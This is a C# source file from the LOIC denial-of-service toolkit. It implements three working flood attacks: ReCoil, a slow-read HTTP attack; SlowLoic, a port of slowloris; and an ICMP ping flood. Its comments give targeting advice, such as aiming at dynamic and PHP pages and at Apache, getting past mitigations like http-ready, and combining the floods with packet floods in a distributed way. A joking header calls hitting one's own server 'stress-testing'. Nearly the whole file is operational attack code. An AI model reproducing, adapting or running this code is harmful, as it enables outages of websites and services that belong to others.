/* collection of some upper layer protocol stress-testing
 * loosely based on the slow-loris attempts and other low bandwidth attempts
 *
 * and always remember:
 * if you hit your own server, it is called: stress-testing
 * if you hit a server that is not yours, it is called: DOS-Attack
 * if you want to test your server but are too stoned to enter your ip correctly,
 * it is called: accident (and always blame it on the weed!)
 *
 * B²
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;

namespace LOIC
{
	/// <summary>
	/// Abstract class cHLDos contributed by B²
	/// </summary>
	public abstract class cHLDos : IFlooder
	{
		public ReqState State = ReqState.Ready;

		/// <summary>
		/// Shows if all possible sockets are build.
		/// TRUE as long as the maximum amount of sockets is NOT reached.
		/// </summary>
		public bool IsDelayed { get; set; }

		/// <summary>
		/// Set or get the current working state.
		/// </summary>
		public bool IsFlooding { get; set; }

		/// <summary>
		/// Amount of send requests.
		/// </summary>
		public int Requested { get; set; }

		/// <summary>
		/// Amount of received responses / packets.
		/// </summary>
		public int Downloaded { get; set; }

		/// <summary>
		/// Amount of failed packets / requests.
		/// </summary>
		public int Failed { get; set; }

		/// <summary>
		/// The time in milliseconds between the creation of new sockets
		/// </summary>
		public int Delay { get; set; }

		/// <summary>
		/// The timeout in seconds between requests for the same connection.
		/// </summary>
		public int Timeout { get; set; }

		public virtual void Start()
		{ }

		public virtual void Stop()
		{
			IsFlooding = false;
			IsDelayed = true;
		}

		/// <summary>
		/// override this if you want to test the settings before spreading the word to the hivemind!
		/// should make a single connection and check for the expected outcome!
		/// </summary>
		public virtual bool Test()
		{
			return true;
		}
	}

	/// <summary>
	/// ReCoil basically does a "reverse" DDOS
	/// Requirements: the targeted "file" has to be larger than 24 KB (bigger IS better ;) !)
	/// </summary>
	/// <remarks>
	/// it sends a complete legimit request but throttles the download down to nearly nothing .. just enough to keep the connection alive
	/// the attack-method is basically the same as slowloris ... bind the socket as long as possible and eat up as much as you can
	/// apache servers crash nearly in an instant. this attack however can NOT be mitigated with http-ready and mods like that.
	/// this attack simulates sth like a massive amount of mobile devices running shortly out of coverage (like driving through a tunnel)
	///
	/// due to the nature of the congestian-response this could maybe taken a step further to self-feeding congestion-cascades
	/// if done "properly" in a distributed manner together with packet-floods.(??)
	///
	/// Limitations / Disadvantages:
	/// this does NOT work if you are behind anything like a proxy / caching-stuff.
	/// in this implementation however we are bound to the underlying system-/net-buffers ...
	/// due to that the required size of the targeted file differs -.-
	/// Dataflow: {NET} --> {WINSOCK-Buffer} --> ClientSocket .. so we have to make sure the actual data exceeds
	/// the winsock-buffer + clientsocket-buffer, but we can ONLY change the latter.
	/// from what i could find on a brief search / test the winsock buffer for a 10/100 links lies around 16-18KB
	/// where 1 GBit links have an underlying buffer around 64KB (size really does matter :P )
	///
	/// what to target?:
	/// although it might makes sense to target pictures or other large files on the server this doesn't really makes sense!
	/// the server could (and in most cases does - except for apache) always read directly from the file-stream resulting in nearly 0 needed RAM
	/// --> always target dynamic content! this has to be generated on the fly / pulled fom a DB
	/// and therefor most likely ends up in the RAM!
	///
	/// high-value targets / worst case szenario:
	/// as it seems the echo statement in php writes directly to the socket .. considering this it should be possible to
	/// take down the back-end infrastructure if the page does an early flush causing the congestation while still holding DB-conns etc.
	/// </remarks>
	public class ReCoil : cHLDos
	{
		private string _dns;
		private string _ip;
		private int _port;
		private string _subSite;
		private bool _random;
		private bool _usegZip;
		private bool _resp;

		private int _nSockets;
		private List<Socket> _lSockets  = new List<Socket>();
		private BackgroundWorker bw;

		/// <summary>
		/// creates the ReCoil object. <.<
		/// </summary>
		/// <param name="dns">DNS string of the target</param>
		/// <param name="ip">IP string of a specific server. Use this ONLY if the target does loadbalancing between different IPs and you want to target a specific IP. normally you want to provide an empty string!</param>
		/// <param name="port">the Portnumber. however so far this class only understands HTTP.</param>
		/// <param name="subsite">the path to the targeted site / document. (remember: the file has to be at least around 24KB!)</param>
		/// <param name="delay">time in milliseconds between the creation of new sockets.</param>
		/// <param name="timeout">time in seconds between request on the same connection. the higher the better .. but should be UNDER the timout from the server. (30 seemed to be working always so far!)</param>
		/// <param name="random">adds a random string to the subsite so that every new connection requests a new file. (use on searchsites or to bypass the cache / proxy)</param>
		/// <param name="nSockets">the amount of sockets for this object</param>
		/// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891 - keep in mind, that the compressed file still has to be larger than ~24KB! (maybe use on large static files like pdf etc?)</param>
		public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip)
		{
			this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
			this._ip = ip;
			this._port = port;
			this._subSite = subSite;
			this._nSockets = nSockets;
			if (timeout <= 0)
			{
				this.Timeout = 30000; // 30 seconds
			}
			else
			{
				this.Timeout = timeout * 1000;
			}
			this.Delay = delay+1;
			this._random = random;
			this._usegZip = usegZip;
			this._resp = resp;
			this.IsDelayed = true;
			Requested = 0; // we reset this! - meaning of this counter changes in this context!
		}
		public override void Start()
		{
			this.IsFlooding = true;
			this.bw = new BackgroundWorker();
			this.bw.DoWork += bw_DoWork;
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}
		public override void Stop()
		{
			this.IsFlooding = false;
			this.bw.CancelAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				int bsize = 16;
				int mincl = 16384; // set minimal content-length to 16KB
				byte[] rbuf = new byte[bsize];
				string redirect = "";
				DateTime stop = DateTime.UtcNow;
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);

				State = ReqState.Ready;
				while (this.IsFlooding)
				{
					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
					State = ReqState.Connecting; // SET STATE TO CONNECTING //

					// forget about slow! .. we have enough saveguards in place!
					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
					{
						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
						socket.ReceiveTimeout = Timeout;
						socket.ReceiveBufferSize = bsize;
						try
						{
							socket.Connect(RHost);
							socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
							byte[] sbuf = Functions.RandomHttpHeader("GET", _subSite, _dns, _random, _usegZip, 300);
							socket.Send(sbuf);
						}
						catch { }

						if (socket.Connected)
						{
							bool keeps = !_resp;
							if (_resp)
							{
								do
								{ // some damn fail checks (and resolving dynamic redirects -.-)
									if (redirect != "")
									{
										if (!socket.Connected)
										{
											socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
											socket.ReceiveTimeout = Timeout;
											socket.ReceiveBufferSize = bsize;
											socket.Connect(RHost);
										}
										byte[] sbuf = Functions.RandomHttpHeader("GET", redirect, _dns, false, _usegZip, 300);
										socket.Send(sbuf);
										redirect = "";
									}
									keeps = false;
									try
									{
										string header = "";
										while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
										{
											header += Encoding.ASCII.GetString(rbuf);
										}
										string[] sp = header.Split(new char[]{'\r','\n'}, StringSplitOptions.RemoveEmptyEntries);
										for (int i = (sp.Length - 1); this.IsFlooding && i >= 0; i--)
										{
											string[] tsp = sp[i].Split(new char[]{':'}, 2, StringSplitOptions.RemoveEmptyEntries);

											if (tsp.Length != 2)
												continue;

											tsp[0] = tsp[0].Trim();
											tsp[1] = tsp[1].Trim();

											if (tsp[0] == "Location")
											{ // parse and follow the redirect
												redirect = tsp[1];
												if (!redirect.StartsWith("/"))
												{
													try { redirect = new Uri(redirect).PathAndQuery; }
													catch { redirect = ""; }
												}
												break;
											}
											else if (tsp[0] == "Content-Length")
											{ // checking if the content-length is long enough to work with this!
												int sl = 0;
												if (int.TryParse(tsp[1], out sl) && sl >= mincl)
												{
													keeps = true;
													break;
												}
											}
											else if (tsp[0] == "Transfer-Encoding" && tsp[1].ToLowerInvariant() == "chunked")
											{ //well, what doo?
												keeps = true;
												break;
											}
										}
									}
									catch
									{ }
								} while (redirect != "" && DateTime.UtcNow < stop);

								if (!keeps)
									Failed++;
							}
							if (keeps)
							{
								socket.Blocking = true; // we rely on this in the dl-loop!
								_lSockets.Insert(0, socket);
								Requested++;
							}
						}
						if (_lSockets.Count >= _nSockets)
						{
							this.IsDelayed = false;
						}
						else if (Delay > 0)
						{
							System.Threading.Thread.Sleep(Delay);
						}
					}

					State = ReqState.Downloading;
					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
					{ // keep the sockets alive
						try
						{
							// here's the downfall: if the server at one point decides to just discard the socket
							// and not close / reset the connection we are stuck with a half-closed connection
							// testing for it doesn't work, because the server than resets the connection in order
							// to respond to the new request ... so we have to rely on the connection timeout!
							if (!_lSockets[i].Connected || (_lSockets[i].Receive(rbuf) < bsize))
							{
								_lSockets.RemoveAt(i);
								Failed++;
								Requested--; // the "requested" number in the stats shows the actual open sockets
							}
							else
							{
								Downloaded++;
							}
						}
						catch
						{
							_lSockets.RemoveAt(i);
							Failed++;
							Requested--;
						}
					}

					State = ReqState.Completed;
					this.IsDelayed = (_lSockets.Count < _nSockets);
					if (!this.IsDelayed)
					{
						System.Threading.Thread.Sleep(Timeout);
					}
				}
			}
			catch
			{
				State = ReqState.Failed;
			}
			finally
			{
				this.IsFlooding = false;
				// not so sure about the graceful shutdown ... but why not?
				for (int i = (_lSockets.Count - 1); i >= 0; i--)
				{
					try
					{
						_lSockets[i].Close();
					}
					catch { }
				}
				_lSockets.Clear();
				State = ReqState.Ready;
				this.IsDelayed = true;
			}
		}
	} // class ReCoil

	/// <summary>
	/// SlowLoic is the port of RSnake's SlowLoris
	/// </summary>
	public class SlowLoic : cHLDos
	{
		private string _dns;
		private string _ip;
		private int _port;
		private string _subSite;
		private bool _random;
		private bool _randcmds;
		private bool _useget;
		private bool _usegZip;

		private int _nSockets;
		private BackgroundWorker bw;
		private List<Socket> _lSockets  = new List<Socket>();

		/// <summary>
		/// creates the SlowLoic / -Loris object. <.<
		/// </summary>
		/// <param name="dns">DNS string of the target</param>
		/// <param name="ip">IP string of a specific server. Use this ONLY if the target does loadbalancing between different IPs and you want to target a specific IP. normally you want to provide an empty string!</param>
		/// <param name="port">the Portnumber. however so far this class only understands HTTP.</param>
		/// <param name="subsite">the path to the targeted site / document. (remember: the file has to be at least around 24KB!)</param>
		/// <param name="delay">time in milliseconds between the creation of new sockets.</param>
		/// <param name="timeout">time in seconds between a new partial header is sent on the same connection. the higher the better .. but should be UNDER the READ-timeout from the server. (30 seemed to be working always so far!)</param>
		/// <param name="random">adds a random string to the subsite</param>
		/// <param name="nSockets">the amount of sockets for this object</param>
		/// <param name="randcmds">randomizes the sent header for every request on the same socket. (however all sockets send the same partial header during the same cyclus)</param>
		/// <param name="useGet">if set to TRUE it uses the GET-command - due to the fact that http-Ready mitigates this change this to FALSE to use POST</param>
		/// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891</param>
		public SlowLoic(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool randcmds, bool useGet, bool usegZip)
		{
			this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
			this._ip = ip;
			this._port = port;
			this._subSite = subSite;
			this._nSockets = nSockets;
			if (timeout <= 0)
			{
				this.Timeout = 30000; // 30 seconds
			}
			else
			{
				this.Timeout = timeout * 1000;
			}
			this.Delay = delay;
			this._random = random;
			this._randcmds = randcmds;
			this._useget = useGet;
			this._usegZip = usegZip;
			this.IsDelayed = true;
			Requested = 0; // we reset this! - meaning of this counter changes in this context!
		}
		public override void Start()
		{
			this.IsFlooding = true;
			this.bw = new BackgroundWorker();
			this.bw.DoWork += bw_DoWork;
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}
		public override void Stop()
		{
			this.IsFlooding = false;
			this.bw.CancelAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				// header set-up
				byte[] sbuf = Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
				byte[] tbuf = Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
				DateTime stop = DateTime.UtcNow;
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);

				State = ReqState.Ready;
				while (this.IsFlooding)
				{
					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
					State = ReqState.Connecting; // SET STATE TO CONNECTING //

					// we have to do this really slow
					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
					{
						if (_random == true)
							sbuf = Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));

						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
						try
						{
							socket.Connect(RHost);
							socket.NoDelay = true;
							socket.Blocking = false;
							socket.Send(sbuf);
						}
						catch
						{ }

						if (socket.Connected)
						{
							_lSockets.Add(socket);
							Requested++;
						}
						this.IsDelayed = (_lSockets.Count < _nSockets);
						if (this.IsFlooding && this.IsDelayed && (Delay > 0))
						{
							System.Threading.Thread.Sleep(Delay);
						}
					}
					State = ReqState.Requesting;
					if (_randcmds)
					{
						tbuf = Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", Functions.RandomString(), Environment.NewLine));
					}
					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
					{ // keep the sockets alive
						try
						{
							if (!_lSockets[i].Connected || (_lSockets[i].Send(tbuf) <= 0))
							{
								_lSockets.RemoveAt(i);
								Failed++;
								Requested--; // the "requested" number in the stats shows the actual open sockets
							}
							else
							{
								Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
							}
						}
						catch
						{
							_lSockets.RemoveAt(i);
							Failed++;
							Requested--;
						}
					}

					State = ReqState.Completed;
					this.IsDelayed = (_lSockets.Count < _nSockets);
					if (!this.IsDelayed)
					{
						System.Threading.Thread.Sleep(Timeout);
					}
				}
			}
			catch
			{
				State = ReqState.Failed;
			}
			finally
			{
				this.IsFlooding = false;
				// not so sure about the graceful shutdown ... but why not?
				for (int i = (_lSockets.Count - 1); i >= 0; i--)
				{
					try
					{
						_lSockets[i].Close();
					}
					catch { }
				}
				_lSockets.Clear();
				State = ReqState.Ready;
				this.IsDelayed = true;
			}
		}
	} // class SlowLoic

    //start of ICMP class
    public class ICMP : cHLDos
    {
        private string _ip;
        private int _PingsPerThread;
        private byte[] _BytesToSend;
        private Ping _pingSender;
        private PingOptions _opt;
        private bool _RandomMessage;
        private BackgroundWorker bw;

        /// <summary>
        /// Create the ICMP object, because we need that, for reasons
        /// </summary>
        public ICMP(string ip, int delay, bool RandomMessage, int PingsPerThread)
        {
            this.Delay = delay;

            this._ip = ip;
            this._PingsPerThread = PingsPerThread;
            this._pingSender = new Ping();
            this._RandomMessage = RandomMessage;
            this._BytesToSend = new byte[65000];

            this._opt = new PingOptions();
            this._opt.Ttl = 128;

            if (RandomMessage)
            {
                //if we're sending messages, fragment as greater processing power needed on server to reconstruct
                this._opt.DontFragment = false;
            }
            else
            {
                //not sending messages, don't fragment, ddos through straight volume of requests
                this._opt.DontFragment = true;
            }
        }

        public override void Start()
        {
            this.IsFlooding = true;
            this.bw = new BackgroundWorker();
            this.bw.DoWork += bw_DoWork;
            this.bw.RunWorkerAsync();
            this.bw.WorkerSupportsCancellation = true;
        }

        public override void Stop()
        {
            this.IsFlooding = false;
            this.bw.CancelAsync();
        }

        //while working away
        private  void bw_DoWork (object sender, EventArgs e)
        {
            while (this.IsFlooding)
            {
                _BytesToSend = new Byte[0];

                if (_RandomMessage)
                {
                    _BytesToSend = new Byte[65500];
                    //fill an array with 0 to 65499 random bytes bytes
                    int b = 0;
                    while (b < Functions.RandomInt(0,65499))
                    {
                        this._BytesToSend[b] = Convert.ToByte(Functions.RandomInt(0, 255));
                        b++;
                    }
                }

                State = ReqState.Ready;

                for (int i = 0; i < _PingsPerThread && this.IsFlooding; i++)
                {
                    State = ReqState.Connecting;
                    try
                    {
                        //send the data with a timeout value of 10ms
                        _pingSender.SendAsync(_ip, 10, _BytesToSend, _opt);
                        Requested++;
                    }
                    catch (Exception)
                    {
                        Failed++;
                    }
                    //dispose of the pingSender because why do WE need to see the replies ;)
                    try
                    {
                        _pingSender.SendAsyncCancel();
                        _pingSender.Dispose();
                    }
                    catch { }
                    State = ReqState.Completed;
                }

                if (this.IsFlooding && Delay > 0)
                {
                    System.Threading.Thread.Sleep(Delay);
                }

                State = ReqState.Ready;
            }
        }
    }
}